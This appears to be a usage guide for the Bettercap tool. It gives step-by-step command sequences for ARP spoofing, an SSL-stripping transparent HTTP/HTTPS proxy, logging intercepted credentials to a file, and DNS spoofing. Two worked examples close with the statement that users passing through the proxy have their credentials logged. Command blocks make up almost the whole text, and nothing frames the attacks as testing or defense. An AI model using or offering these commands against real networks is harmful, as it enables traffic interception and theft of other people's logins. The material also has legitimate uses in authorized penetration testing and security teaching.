Basic Usage
===========

Bettercap offers a wide range of modules and functionalities for network analysis and manipulation. Here are some essential components and basic usage:

1. **Starting Bettercap**:

   .. code-block:: bash

      sudo bettercap

2. **MITM Attack with ARP Spoofing**:

   .. code-block:: bash

      net.probe on
      net.sniff on
      set arp.spoof.targets <target-IP>
      arp.spoof on

3. **HTTP and HTTPS Proxy**:

   .. code-block:: bash

      set http.proxy.sslstrip true
      set http.proxy.sslstrip.upgrade_insecure_requests true
      set http.proxy.sslstrip.transparent true
      set http.proxy.address <proxy-IP>
      set http.proxy.port <proxy-port>
      http.proxy on

4. **Capturing Credentials**:

   .. code-block:: bash

      set events.stream.output <output-file>
      events.stream on
      set http.proxy.sslstrip.logcreds true

5. **DNS Spoofing**:

   .. code-block:: bash

      set dns.spoof.domains <domain>
      dns.spoof on

Examples
========

Example 1: ARP Spoofing Attack
-------------------------------

1. Start Bettercap:

   .. code-block:: bash

      sudo bettercap

2. Enable ARP spoofing:

   .. code-block:: bash

      net.probe on
      net.sniff on
      set arp.spoof.targets <target-IP>
      arp.spoof on

Example 2: HTTPS Proxy with Credential Capture
------------------------------------------------

1. Start Bettercap:

   .. code-block:: bash

      sudo bettercap

2. Configure the HTTPS proxy and credential capture:

   .. code-block:: bash

      set http.proxy.sslstrip true
      set http.proxy.sslstrip.upgrade_insecure_requests true
      set http.proxy.sslstrip.transparent true
      set http.proxy.address <proxy-IP>
      set http.proxy.port <proxy-port>
      http.proxy on
      set events.stream.output <output-file>
      events.stream on
      set http.proxy.sslstrip.logcreds true

3. Users connecting through the proxy will have their credentials logged.
